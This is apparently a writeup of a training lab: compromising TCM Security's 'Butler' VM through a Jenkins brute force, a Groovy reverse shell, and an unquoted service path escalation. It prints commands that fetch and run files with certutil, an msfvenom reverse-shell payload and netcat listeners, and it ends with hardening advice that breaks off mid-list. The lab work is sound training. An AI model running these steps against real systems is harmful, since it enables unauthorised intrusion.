---
title: "Butler"
date: 2025-01-01
hideDate: true
draft: false
tags: ["others", "practice", "easy"]
categories: ["writeups"]
summary: "**Goal:** gain administrator (SYSTEM) privileges on the _Butler_ vulnerable VM from the Practical Ethical Hacking course (TCM Security)."
ShowToc: true
TocOpen: false
platformLabel: "TCM Security"
cover:
  image: "00-card.png"
  alt: "Butler"
  relative: true
---

# Butler — Writeup (TCM Security vulnerable VM)

**Goal:** gain administrator (SYSTEM) privileges on the _Butler_ vulnerable VM from the Practical Ethical Hacking course (TCM Security).


![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcMCTBdWxl03zbU3cuL1dALS8zQBPFtmNX9TUKX9cL5ild4LHxVFnhd_mB40SOnKIUj_tXBAIku3aqB-qyl58tfovDxK7uEoP_hqMTnis-osUEz2-vi176OUgl9ZVZfAxlIY0I?key=S_yM96Sthx41XQz_CIXW-AL-)

## 1. Port scan - Nmap

Let’s begin with a Nmap scan:

```shell
sudo nmap -T4 -p- -A -vv 192.168.XX.XX
```

- -T4 : Timing template, 4 is for an aggressive scan. This is not a real-life scan so we can launch a “noisy” scan.
- -p- : To scan all the ports (1 to 65535)
- -A : Aggressive scan options = OS detection (-O) + version scanning (-sV) + script scanning (-sC) + traceroute
- -vv : Verbose mode


![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcp9pl3rioo88BM8M_FoSf5pL2-Fm-vyGOX_FNBngRnWQF7UR6X7co2oTqGnG9SltwMUsLIXCipPvd8yWU633i3AsjcBSDDOBqu94ucdSEBUWxd-TUMYyI8JiN9oKUfUlyQzHUX?key=S_yM96Sthx41XQz_CIXW-AL-)
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfWOv0HAafBv5XNpjJ0wKPYZ4SwYt6BY9Dl-pYZU3NIP1-xY20ANAvVOaUUnK04I-3qew23xbADq9VzGtCHWWspeBny_JbR_KEOlSk1D-FZGa821utcshKSgUFw5hweTUyphFFa8w?key=S_yM96Sthx41XQz_CIXW-AL-)

### Open ports

- 135 — msrpc
- 139 — smb
- 445 — smb
- 5040 — unknown
- 7680 — pando-pub ?
- 8080 — http — Jetty 9.4.41.v20210516
	- Info about robots.txt
- 49664–49669 — msrpc

Note: Jetty on port 8080 and `robots.txt` worth investigating.

## 2. Checking website on port 8080

Opened `http://<target>:8080`

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXftUROLfbDCp-mtfoev-WEzyefCYUtixL9s2ueY0aAZhRlApqEosZdLHOInVf3HktRNHHSRSaN2XC6GqWDBDwXtgydBnFHsWXfE-EIw6JLrENAoUSGcxaEejJ7Y_GGMe--cxPTB8Q?key=S_yM96Sthx41XQz_CIXW-AL-)

Here, i’ve spent lot of time to find a way to bypass this login prompt and check several exploits but nothing interesting. I have tried some module with Metasploit…and…nothing.

I tried the Brute force login with Burp Suite method.

## 3. Brute-forcing the web login with BurpSuite

Used Burp Suite to brute force the login form:

Set proxy to `127.0.0.1:8080` and captured the login request.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcyB2W6u9Kehcvv95oXbL3NLLndhs46CirVnSun-sCux7nmICqC-jPn_goZO8dIK97Dd_ZB-CF6Jv6kFI-YXheO7OxNIMhXVzNbrziHupfCSGHYGN5DLIHTYqw3oI14euBhN9652g?key=S_yM96Sthx41XQz_CIXW-AL-)

Sent the request to **Intruder** and cleared default payloads.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXckLDV2lL8PQw28i_BHZEYJTTtNY_g3JeTFP0daq4l3nSK8j-558vW4snlDsvnxzPCFB1_-XDJzjPpLcLhxD5mgl5Z1sZBrbjxROjjLQdAbKJ1WvN4wKdaSwWDGRtcPs6Sv72uaEA?key=S_yM96Sthx41XQz_CIXW-AL-)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfGmxXdoGa5rolqG8PGpZV3_r7jUiuRsAFRpKqUxQDwQ6vCAeBDYGFPkj-1d9wGUzBeDiO0AbMu3aTyyfhQldwmyqMttfjWFmdSev0vfXsMkwO37NTVSzkcoKuQwUSyfDrsFGYQCw?key=S_yM96Sthx41XQz_CIXW-AL-)

In the Intruder i have selected the clear § button.

Marked the `username` and `password` fields (Add §).

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdEQlWUQd62LUmhCsU5ozT15GEDrVi0wlZzEOKwBNR6zLJupj0-4Ba9labhQw57UpfogQiRNkDvpO51VxbT8-hcMqpgrmgNACz61FlN2SZLPAYEuQLNQOX6CPWxV4Z70tPpqjeZUg?key=S_yM96Sthx41XQz_CIXW-AL-)

I'm, gonna use the Cluser Bomb attack, because I have no idea what the username and password is.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeOQ4obOXLJKBRhJtsfF-7LPzOZtB0zQ5evohsW_K0ek7NJSJDzMronz4z85Zae6h5TP2BFJ6CnFQyE7U8ZqrrmjRvzYxe1Sbyik4xix5hDzvRcxaj_87KYFnlk6CBGVgW5L4LAkQ?key=S_yM96Sthx41XQz_CIXW-AL-)

In the Payload section, select Payload set 1 and add some basic usernames like admin, administrator, user, jenkins. I'm going do the same thing for the Payload set 2 (for the passwords) with Password, password, 123456, jenkins, Jenkins:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXecGkgRMCu7Frrej6lSTSbS9omLulhz9hI_JWB2DwtOVFV12c-tKDK86V4HjmVMjCXWnJzfr9020QjB5wBj48pNV6per4StlkgpsiI9CEFUjf3pCtziduQz8OTWHYM360p0mEFNSg?key=S_yM96Sthx41XQz_CIXW-AL-)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcCp81oqXpllcIZn7b3pd8YEhCDicp196uWBkKh4cL2tUgOhIr-my7QW1nK220gWkAmA-BtR-ENIKQ9UsiTopgc9OWbo5-Ha521gZ9kUCvB25EzhIIxeTUI1PGy1Li4GqA6zXtdCw?key=S_yM96Sthx41XQz_CIXW-AL-)

I found this little change on I can see that the length of the “jenkins / jenkins” line is smaller:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdiNl2aDABlqu5VDfzGgStilEAX2tySUGfc2BaAQtFXdy_QZ7U52MgaeuVIfWWHc3Fxh_656Vcav5hTRSeoTIqWUh8Cv7ZPxCCvtJyp2OoNZoepFqmyjEwyBqTNORvazvX2mXSp5g?key=S_yM96Sthx41XQz_CIXW-AL-)

Let’s try these credentials and that’s it !
Successful credentials: **jenkins:jenkins**.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcwEVT0AZnEfqS-AAuvcLzbhwZHPE2nnVykAuR5yoIM2j-Z3p_vDziQGBBv6Nz_9SMW-khjNk0wE_VC1-qoJSVlq-D0iknXCArGzvr7wuLZ-vjUsBBHNr_eRFg2ND3Za6OsxA-jQg?key=S_yM96Sthx41XQz_CIXW-AL-)

## 4. Jenkins access — Script Console CMD

After logging in, navigated to **Manage Jenkins → Script Console** which allows executing Groovy scripts with Jenkins privileges. This is a powerful vector for command execution on the host.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXf8mUOjylxjUaE-M1RdllOz4SaZ7CWWVI800e3KmgZuTut-K0IYL9lBw3cDYABvpAnp3lR6T10k0skeNM4Xivvl2nG8Bm0nPJYGal4WIXTFtlL6tJdf6Q8NDZNx1_yL3tTRgymp?key=S_yM96Sthx41XQz_CIXW-AL-)

Found a public Groovy reverse shell script online. Modified it to connect back to the attacker and executed it.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeU1qmQ0YJ5YAw9yrYigDBZjMd66WYhhTeT6IG3Kp2hUeZJXxt3zqUEUXolhY9802_0RUi7exZKiCaQaapFB9fIbJ93XO_G90Zyl2Lq8jpQTSQO44hDCDfkSr3VtEqmQKw_u1S6?key=S_yM96Sthx41XQz_CIXW-AL-)

I'm gonna set the attack ip adres in the script and setup listener for port 8044 and run this.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd7N7zyUi_SdNDYdBB_LbaT16qtUzAiwNtsRS8wQrZZ8MdA1cwtuWFLgMQzrH5ejwkSzkcTTwU2lcBi9DKoPlshr23gYjJAE3dl4RI11ljE6BOiyDiEiNe0bvmyrajSzRIJTNyQTQ?key=S_yM96Sthx41XQz_CIXW-AL-)

```shell
nc -nvlp 8044
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcFFlwuNJ24PyCLhXTIRxWHXWlAYRkdweMjpiVW7mlipkBXnXf4KM5-Dx0ML0D-dFBGvXAXZVo4LLqHx7xh55tfwDMIp_vtP7xx-7IJwviY6sr9nbuI2v8bukMu1VOXcA8HanYl?key=S_yM96Sthx41XQz_CIXW-AL-)

And I'm in the machine!

I'm now a butler (user), so not system administrator.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdLj7fiLvHfoFfOrYfcl5pBvO5Dh8pCfns0ffJjPgqDPOaT67Lxz6mf76Gy9jmgtaV15ZMhCCAOHTIHP6xCx7tXhu7xi0FiGakHukDY3EZ2V5NTO-WwjXIiYASlLyNNfVWjwIpvNQ?key=S_yM96Sthx41XQz_CIXW-AL-)

## 5. Local enumeration — gathering system info
I have runned the command "systeminfo" to get little bit more information.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcw40ULp1Yh8sh7k7bFhOTOlm4JBnt9xfhbEami28uI2IkWG1xxh-0AZcHg-f_9yYcXXZbL6DMmRJY-yplBIkpffbyirImp2_iwt4TW-jJLwmzvBph2QP6vPDbBUJCMlsXMkrMrzQ?key=S_yM96Sthx41XQz_CIXW-AL-)

I'm gonna use Windows Privilege Escalation tool an that is WinPEAS, a compilation of local Windows privilege escalation scripts to check for cached credentials, user accounts, access controls, interesting files, registry permissions, service accounts, patch levels, and more.

## 6. Privilege escalation — Unquoted Service Path

I'm gonna use this:

https://github.com/peass-ng/PEASS-ng/releases/tag/20250401-a1b119bc

I'm gonna move this download file to my Transfer file.

```shell
mv ~/Downloads/winPEASx64.exe ~/Transfer/
cd ~/Transfer
ls
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeWZMArFpvIh10ONhbJo7TjuYQa1xMrfQYGuteczqOP8ri82JEL8CBIYVoS6VLPGpnqSMXMirLb8mxeK1-n0EHRLOBeIh3-iLhakRuMMi6HmPpp8_wM5N82sCA88nZjXTzGy0LAmQ?key=S_yM96Sthx41XQz_CIXW-AL-)

start a server an transfer this folder

```shell
python3 -m http.server 80
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXchMgOurJ7D8vBB3301QA_xYRzZWgeaeG24bbapN70_jB46ALmnAOgkM20_FmJ9574DyBD2a_47SBylr0kG_zdgG3cSLoVl_JenhqUcDFmM1bubMgPpApBMbKSRfTPFD7tfDFDoAQ?key=S_yM96Sthx41XQz_CIXW-AL-)

I'm going to use this tool (target machine):

```
certutil.exe -urlcache -f http://192.168.100.128/winpeas.exe winpeas.exe
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdFGH0XcaccBZIuqWBhlxnQTm719W16AO_0MHWVt8Lw73WKOd0UfrIDQ7uzOLRD4byWDC0wsWySVFHGqsZqQCqXJuCg74g82NDOiyYGCG7iZzuu5c33N44wB7uRN9PkvM3Cwc25kw?key=S_yM96Sthx41XQz_CIXW-AL-)

I have executed winpeas.exe, there are a lot of results but the most important is the section below:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe3hxbBX5nzrn_SrkJP2D-YC42PzfUjcpIzdIB0RgZHDERotlJYyTQnJAXZ4j7bfTDf418522vAM1k52qLaAbSiNtcHsnD2iFByXjZ4zDDkNnJ-Y0x0TG6o2rWuKPNYNtucHYL9oA?key=S_yM96Sthx41XQz_CIXW-AL-)

This will allow me to exploit a vulnerability called “Unquoted Service Path”.

I'm going to generate payload with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.128 LPORT=7777 -f exe -o Wise.exe
```

- -p it means payload.
- LHOST Setting up attack ip machine listener.
- LPORT Setting up the port we gonna listen.
- -f file type.
- -o output is our .exe file

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeoPNlmpAM44UgeKSdZx6NEqP0EVx7-CWVbaRUNDFD-5QkJvF37xS3iw5eRwkPEhrk8mQByhShjsej1rOzo-ejyKp8xw7L_DaAXO6oXP20YT0QBy9dC9nRFWTjTkv7qCTim6VYmSg?key=S_yM96Sthx41XQz_CIXW-AL-)

I'm gonna set up back our server.

And I putted Wise in here

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXecZnDTCb2PMbftzaxlldMp3dZcSo5I-O5_nfK8a6EGiBy3uYH6ZMGZdmWNNCNIxkHyyQzzwEfxzIHQuJnQkH-cS7ZDRApyneAOQN1yqLYWHD8hXiCIlgBbHo5jJwnNed_43u_a?key=S_yM96Sthx41XQz_CIXW-AL-)

I'm going to use the same method wit certutil to transfer Wise.

```shell
certutil.exe -urlcache -f http://192.168.100.128/Wise.exe Wise.exe
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcukSeaBsg7H6htN87DDKOF8GyIc4XaD0QELDz_ooCSxEx1B-o209jIk4N_EFA-RvsV71dI4qT7ydjFflAdPQ1MyPyDrzNlhuCZ2jtlK462mdV-G60I6ltyxWcirkD67gsZe01ZiA?key=S_yM96Sthx41XQz_CIXW-AL-)

I need now to stop the service that is running. I can use this command:

```shell
sc stop WiseBootAssistant
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcY3GHir0gj87l5_r5OMFFLZcHiB8XaByk1SOPrA-y_lcmAhWTYDZuYo1YUeam-zUHJMx7vdQkiAhfvQRmp5N5JymvhZXwx8J7-R4o0CtGXCmR4g_dJNd65cLy_RAdgZ_KUEuLU?key=S_yM96Sthx41XQz_CIXW-AL-)

I'm going to start it and it's going to execute as the system

```shell
sc start WiseBootAssistant
```

On Kali, listen for the final SYSTEM shell:

```shell
nc -nvlp 7777
```

The shell come back and we are now in.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeIk0KGww8RdaxBAQH-W47AOR1GZ-YjINi2a8drleeUXhmsI6dWDNYf8CFXH0YocedpNOtFPgrhbstS5SuWJFQkV1vJgAwDtGRf2EJkcmQqqFy3kQfeLkK8l1i5GR7UpTiPnVSwhQ?key=S_yM96Sthx41XQz_CIXW-AL-)

## 7. Recommendations

To prevent similar attacks:

1. **Jenkins security:**
    - Do not expose Jenkins UI publicly; restrict access to trusted IPs.
    - Enforce strong credentials and multi-factor authentication.
    - Keep Jenkins and plugins up to date.
    - Restrict who can run Groovy scripts — only trusted admins.

2. **Unquoted service paths:**
    - Audit service `ImagePath` entries and wrap paths containing spaces in quotes, e.g.:
